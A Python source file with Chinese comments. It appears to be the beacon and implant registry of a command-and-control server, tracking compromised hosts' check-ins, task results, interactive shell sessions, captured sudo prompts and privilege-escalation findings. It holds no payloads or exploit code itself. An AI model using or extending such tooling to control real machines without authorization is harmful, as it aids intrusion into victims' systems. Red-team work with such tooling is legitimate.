"""
server/client_manager.py — 客户端状态管理，线程安全。

ClientRecord: 单个 Beacon 的运行时状态
TaskResult: 单次任务执行结果
ClientManager: 线程安全的注册表
"""

import threading
from collections import deque
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class TaskResult:
    """单次任务执行结果"""
    task_id: str
    output: str = ""
    error: str = ""
    received_at: datetime = field(default_factory=datetime.now)


class ClientRecord:
    """单个客户端的运行时状态。

    Attributes:
        client_id: 唯一标识 (植入物随机生成)
        is_client: 是否为 Client 连接
        via: 连接来源标记（"" 直连 / "proxy" 经代理，U1）
        is_fork: 是否 fork 分裂出的 beacon（fork 模块新 ID 注册）
        is_shell: 是否处于交互式 shell 模式（shell 模块激活，注册带 shell 标记）
        first_seen: 首次上线时间
        last_seen: 最近回连时间
        results: 执行结果历史（deque 限长，S6）
        has_init: 是否已完成初始化
        sys_user: 系统用户名
        sys_os: 操作系统信息
        sys_platform: "linux" | "windows" | "macos" | ""
    """

    def __init__(self, client_id: str, is_client: bool = False,
                 max_results: int = 200):
        self.client_id = client_id
        self.is_client = is_client
        self.via = ""
        self.is_fork = False
        self.is_shell = False
        self.running_tasks: list = []  # 植入物 register 上报的运行中任务(task_id 列表)
        # 活跃会话计数(2026-09-04 B15): 同一 bid 的重叠会话各 +1, 会话结束
        # 各自 -1——原单布尔 active 在 A/B 会话重叠时 A 的 close 会清掉 B 的
        # 标记, cleanup 可能误清仍在线的 beacon; 计数在 cleanup 锁内校验
        self.active = 0
        self.tags: list = []     # 标签/分组（tag 命令设置，22）
        now = datetime.now()
        self.first_seen = now
        self.last_seen = now
        self.results: deque = deque(maxlen=max_results)
        self.has_init = False
        self.sys_user = ""
        self.sys_os = ""
        self.sys_platform = ""

    def __repr__(self) -> str:
        kind = "Client" if self.is_client else "Beacon"
        return (f"ClientRecord({self.client_id[:8]}..., {kind}, "
                f"last={self.last_seen.strftime('%H:%M:%S')})")


class ClientManager:
    """线程安全的客户端注册表。"""

    def __init__(self, max_results_per_beacon: int = 200):
        self._max_results = max_results_per_beacon
        self._clients: dict[str, ClientRecord] = {}
        self._lock = threading.Lock()

    def register(self, client_id: str, is_client: bool = False) -> tuple[str, bool]:
        """注册新客户端或更新已有客户端。

        Returns:
            (client_id, is_new) — is_new=True 表示首次上线
        """
        with self._lock:
            existing = self._clients.get(client_id)
            if existing:
                existing.last_seen = datetime.now()
                return client_id, False
            record = ClientRecord(client_id=client_id, is_client=is_client,
                                  max_results=self._max_results)
            self._clients[client_id] = record
            return client_id, True

    def get_client(self, client_id: str) -> Optional[ClientRecord]:
        """获取客户端记录。"""
        with self._lock:
            return self._clients.get(client_id)

    def list_clients(self) -> list[ClientRecord]:
        """返回所有已注册客户端的列表。"""
        with self._lock:
            return list(self._clients.values())

    def mark_seen(self, client_id: str) -> None:
        """更新最近回连时间。"""
        with self._lock:
            rec = self._clients.get(client_id)
            if rec:
                rec.last_seen = datetime.now()

    def add_result(self, client_id: str, result: TaskResult,
                   overwrite: bool = False) -> bool:
        """记录任务执行结果。

        v2 批量模型:implant 可能重发未获 ACK 的结果——按 task_id 去重,
        已存在则跳过。返回 True=新增, False=重复或 beacon 不存在。

        overwrite=True(交互式 shell 会话):同 task_id 结果**覆盖**旧值——
        shell 命令执行期间每次回连上报当前累积输出(如 sudo 的 password:
        提示),服务端保留最新一份,前端按 received_at 增量显示。
        """
        with self._lock:
            rec = self._clients.get(client_id)
            if not rec:
                return False
            for i, r in enumerate(rec.results):
                if r.task_id == result.task_id:
                    if not overwrite:
                        return False  # 重复上报,跳过
                    rec.results[i] = result  # 覆盖
                    return True
            rec.results.append(result)
            return True

    def remove_client(self, client_id: str) -> None:
        """移除客户端记录。"""
        with self._lock:
            self._clients.pop(client_id, None)

    def remove_if_offline(self, client_id: str,
                          expire_seconds: int = 300) -> bool:
        """超时清理(2026-09-04 B15): 判断与删除在锁内原子完成。

        旧流程 cleanup 先 get_offline_clients 快照、再逐个 remove_client——
        两步之间 beacon 可能刚重连注册(刷新 last_seen/active), 照删不误;
        锁内重校验 last_seen 与 active 计数后删除, 消除该 TOCTOU 窗口。
        返回 True=已删除。
        """
        cutoff = datetime.now() - timedelta(seconds=expire_seconds)
        with self._lock:
            rec = self._clients.get(client_id)
            if rec is None:
                return False
            if rec.active > 0 or rec.last_seen >= cutoff:
                return False  # 活跃会话中或刚回连: 不清理
            del self._clients[client_id]
            return True

    def mark_init_done(self, client_id: str) -> None:
        """标记首次初始化完成。"""
        with self._lock:
            rec = self._clients.get(client_id)
            if rec:
                rec.has_init = True

    def set_sysinfo(self, client_id: str, user: str, os_str: str) -> None:
        """缓存 sysinfo 结果，自动判定平台。"""
        with self._lock:
            rec = self._clients.get(client_id)
            if rec:
                rec.sys_user = user
                rec.sys_os = os_str
                os_lower = os_str.lower()
                if "windows" in os_lower:
                    rec.sys_platform = "windows"
                elif "linux" in os_lower:
                    rec.sys_platform = "linux"
                elif "darwin" in os_lower or "macos" in os_lower or "mac os" in os_lower:
                    rec.sys_platform = "macos"

    def set_platform(self, client_id: str, platform: str) -> None:
        """手动设置平台 (linux / windows / macos)。"""
        with self._lock:
            rec = self._clients.get(client_id)
            if rec and platform in ("linux", "windows", "macos"):
                rec.sys_platform = platform

    # Q7 结果处理器回填白名单(sysinfo_parse 等 server 模块返回的字段)。
    # 2026-09-04 B12: 扩充 priv_esc_parse 回填字段(此前不在白名单, 提权
    # 检测结论全部被丢弃, 详情页永不显示)
    _METADATA_FIELDS = ("sys_user", "sys_os", "sys_platform",
                        "priv_suid_n", "priv_suid_gtfobins_n", "priv_cve_list",
                        "kernel_version", "sys_distro")

    def update_metadata(self, client_id: str, fields: dict) -> None:
        """按白名单回填元数据字段（Q7 结果处理器）。未知键丢弃。"""
        with self._lock:
            rec = self._clients.get(client_id)
            if not rec:
                return
            for k, v in fields.items():
                # 支持 str/int/list(priv_esc 回填含计数 int 与 CVE 摘要 str)
                if k in self._METADATA_FIELDS and v not in (None, ""):
                    if isinstance(v, (str, int, list, dict)):
                        setattr(rec, k, v)

    def get_offline_clients(self, timeout: int = 300) -> list[ClientRecord]:
        """获取超时未回连的客户端列表。"""
        cutoff = datetime.now() - timedelta(seconds=timeout)
        with self._lock:
            return [r for r in self._clients.values() if r.last_seen < cutoff]

    def set_max_results(self, n: int) -> None:
        """更新每 beacon 结果保留条数（reload 命令热重载配置用）。"""
        self._max_results = n
